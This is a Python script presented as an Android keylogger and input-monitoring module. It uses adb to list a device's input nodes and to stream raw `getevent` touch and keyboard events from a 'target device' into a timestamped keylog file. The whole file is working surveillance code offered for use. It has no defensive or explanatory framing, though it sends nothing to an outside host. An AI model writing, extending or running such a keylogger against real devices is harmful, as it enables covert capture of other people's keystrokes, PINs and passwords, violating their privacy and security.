"""
Aadi — Android Keylogger & Input Monitoring Module (Enhanced, Logged & Secured)
Author: Aaditya Kumar Pandey | Instagram: @aadi_97621
"""

import subprocess
import os
import time
from typing import List, Tuple, Optional
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt

console = Console()


def _run_adb_cmd(args: List[str], device_id: Optional[str] = None, capture: bool = True) -> Tuple[str, int]:
    """Helper to run ADB commands with error handling and timeout."""
    cmd = ["adb"]
    if device_id:
        cmd += ["-s", device_id]
    cmd += args
    try:
        res = subprocess.run(cmd, capture_output=capture, text=True, timeout=15)
        return res.stdout.strip(), res.returncode
    except subprocess.TimeoutExpired:
        return "TIMEOUT", -2
    except Exception as e:
        return str(e), -1


def list_input_devices(device_id: str) -> None:
    """List connected input devices and their event nodes from the Android system."""
    console.print("[cyan]Fetching active input devices from /proc/bus/input/devices...[/]")
    out, rc = _run_adb_cmd(["shell", "cat /proc/bus/input/devices"], device_id)
    if rc == 0 and out:
        console.print(Panel(out[:3000] + ("..." if len(out) > 3000 else ""), title="[bold]Input Devices Map[/]",
                            border_style="cyan"))
    else:
        console.print(
            "[yellow]⚠ Could not fetch input devices list directly. Make sure device is rooted or accessible.[/]")


def dump_input_events(device_id: str) -> None:
    """Monitor raw touch and keyboard input events, print to console, and save to a log file."""
    if not device_id:
        console.print("[bold red]✗ No device selected. Please connect a device first.[/]")
        return

    console.print(Panel(
        "[bold cyan]🔍 AADI Input Event Monitor & Keylogger Initialized[/]\n"
        "[white]This tool captures raw input events (`getevent`) from the Android kernel.[/]\n"
        "[yellow]⚠ Note: Full event sniffing requires root privileges on the target device.[/]",
        title="[bold red]⚡ Hardware Event Sniffer[/]",
        border_style="magenta"
    ))

    # Optional: List input devices first
    show_devices = Prompt.ask("[cyan]Do you want to inspect available input device nodes first? (y/n)[/]",
                              choices=["y", "n"], default="n")
    if show_devices == "y":
        list_input_devices(device_id)

    # Generate log filename
    timestamp = int(time.time())
    log_filename = f"aadi_keylog_{timestamp}.txt"

    console.print(f"\n[green]✓ Logging live events to:[/] [bold cyan]{log_filename}[/]")
    console.print("[yellow][*] Press Ctrl+C to stop monitoring and save the session.[/]\n")

    cmd = ["adb", "-s", device_id, "shell", "getevent"]

    event_count = 0
    process: Optional[subprocess.Popen] = None
    try:
        # Using Popen to stream live output to both console and file simultaneously
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)

        with open(log_filename, "w", encoding="utf-8") as log_file:
            log_file.write(f"# AADI Keylogger & Input Session Log - Device: {device_id} | Time: {time.ctime()}\n")

            if process.stdout:
                for line in process.stdout:
                    print(line, end="")
                    log_file.write(line)
                    event_count += 1

    except KeyboardInterrupt:
        console.print(f"\n\n[bold green]✓ Monitoring stopped by user.[/]")
        console.print(f"[green]✓ Total events captured: [bold cyan]{event_count}[/][/]")
        console.print(f"[green]✓ Session successfully saved to:[/] [bold underline]{log_filename}[/]")
    except FileNotFoundError:
        console.print("[bold red]✗ 'adb' command not found in system PATH.[/]")
    except Exception as e:
        console.print(f"[bold red]✗ Error during event monitoring: {e}[/]")
    finally:
        if process and process.poll() is None:
            process.terminate()